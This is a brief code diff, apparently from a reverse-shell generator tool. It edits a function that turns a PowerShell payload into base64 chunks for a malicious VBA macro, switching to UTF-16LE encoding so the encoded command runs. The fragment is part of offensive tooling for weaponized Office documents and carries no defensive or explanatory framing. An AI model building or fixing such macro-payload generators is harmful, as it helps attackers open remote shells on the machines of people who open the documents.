@@ -222,7 +222,7 @@ const rsg = {
 
     generateVBAMacro: () => {
         const psCommand = rsg.insertParameters(rsgData.specialCommands['PowerShell payload'], (s) => s);
-        const base64 = btoa(unescape(encodeURIComponent(psCommand)));
+        const base64 = toUTF16LEBase64(psCommand);
 
         const chunks = base64.match(/.{1,255}/g) || [];
 
